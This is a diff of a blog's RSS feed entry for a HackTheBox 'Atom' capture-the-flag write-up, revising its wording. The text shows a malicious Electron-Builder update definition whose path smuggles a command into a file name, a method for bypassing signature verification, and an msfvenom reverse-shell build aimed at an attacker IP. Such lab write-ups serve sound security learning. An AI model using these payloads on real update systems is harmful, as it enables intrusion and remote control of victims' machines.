@@ -12,8 +12,8 @@
       <pubDate>Sat, 10 Jul 2021 20:28:32 +0700</pubDate>
       
       <guid>https://fahmifj.github.io/writeups/hackthebox/htb-atom/</guid>
-      <description>Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to Redis.</description>
-      <content:encoded><![CDATA[<p>Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to Redis. I&rsquo;m able to obtain administrator credentials by dumping the Redis database.</p>
+      <description>Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to a Redis server.</description>
+      <content:encoded><![CDATA[<p>Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to a Redis server. I&rsquo;m able to obtain administrator credentials by dumping the Redis database.</p>
 <h3 id="skills-learned">Skills Learned</h3>
 <ul>
 <li>Exploitation of Electron-Builder app through auto-update.</li>
@@ -164,17 +164,20 @@ $ curl -s http://updates.atom.htb/ | wc -c
 <blockquote>
 <p><em>Since the <code>${tempUpdateFile}</code> variable is provided unescaped to the <code>execFile</code> utility, an attacker could bypass the entire signature verification by triggering a parse error in the script.</em></p>
 </blockquote>
-<p>The following is an example of malicious <code>latest.yml</code> (contains the app update definition) will pop a calculator.</p>
+<p>The following is an example of malicious update definition that will pop a calculator.</p>
 <pre><code>version: 2.0.0
 path: u';calc;'pdate.exe
 sha512: qwP35Rn5PLaBoZ8tzvRFK...&lt;SNIP&gt;...LM3WCmvJUXMYmZGW6T+fI=
 releaseDate: '2021-01-24T13:44:59.064Z'
-</code></pre><p>And if a single quote <code>'</code> is added to <code>path</code>, it breaks the verification, which is simplified as follows:</p>
+</code></pre><p>Sending this <code>u';payload;'pdate.exe</code> as path would be troublesome, which is simplified as follows:</p>
+<pre><code>`Get-AuthenticodeSignature 'u';payload;'pdate.exe' | ConvertTo-Json -Compress`
+</code></pre><p>Now that if a single quote <code>'</code> is added to <code>path</code>, which becomes:</p>
 <pre><code>`Get-AuthenticodeSignature 'u'pdate.exe' | ConvertTo-Json -Compress`
-</code></pre><p>But, by recalculating the hash of <code>u'pdate.exe</code>, an attacker could bypass the signature verification and  <code>u'pdate.exe</code>  would be executed as well.</p>
+</code></pre><p>But then, it would breaks the signature verification.</p>
+<p>And here&rsquo;s come the interesting part, an attacker could easily bypass this signature verification by recalculating the hash of <code>u'pdate.exe</code>. That&rsquo;s very clever, right?</p>
 <h4 id="rce-electron-updater---exploitation">RCE Electron-Updater - Exploitation</h4>
-<p>According to the SMB enumeration, all the <code>client</code> folders are writable, which means exploitation can be done in two ways: local and remote, but I&rsquo;ll go with remote.</p>
-<p>First, I&rsquo;ll generate a reverse shell binary using <code>msfvenom</code>, and I&rsquo;ll this binary with Python web server.</p>
+<p>According to the SMB enumeration, all the <code>client</code> folders are writable, which means exploitation can be done in two ways: local and remote. But, I&rsquo;ll go with remote 😅.</p>
+<p>First, I&rsquo;ll have to generate a reverse shell binary. This can be done with <code>msfvenom</code>. I&rsquo;ll host this binary using Python web server afterwards.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
 $ msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.49 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">53</span> -f exe -o i<span style="color:#ae81ff">\&#39;</span>amf.exe
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -227,7 +230,7 @@ b77e754354e186f...&lt;SNIP&gt;...
      Target:                ATOM\jason
      PersistenceType:       Enterprise
      LastWriteTime:         3/31/2021 2:53:49 AM
-</code></pre></div><p>On Jason&rsquo;s download directory, there is a PortableKanban folder. PortableKanban itself is a password manager. I have familiarity with this application from HTB Sharp. The <code>portablekanban.cfg</code> contains Redis DSN, which includes Redis Database password.</p>
+</code></pre></div><p>On Jason&rsquo;s download directory, there is a PortableKanban folder. PortableKanban itself is a password manager. I have familiarity with this application from HTB Sharp (I&rsquo;ve not been able to pwn it, though 😂).  Its config contains encrypted Redis database password (The clear password revealed in the next section).</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\Users\jason\Downloads&gt;type PortableKanban\PortableKanban.cfg
 type PortableKanban\PortableKanban.cfg
 {&#34;RoamingSettings&#34;:{&#34;DataSource&#34;:&#34;RedisServer&#34;,&#34;DbServer&#34;:&#34;localhost&#34;,&#34;DbPort&#34;:6379,&#34;DbEncPassword&#34;:&#34;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb&#34;
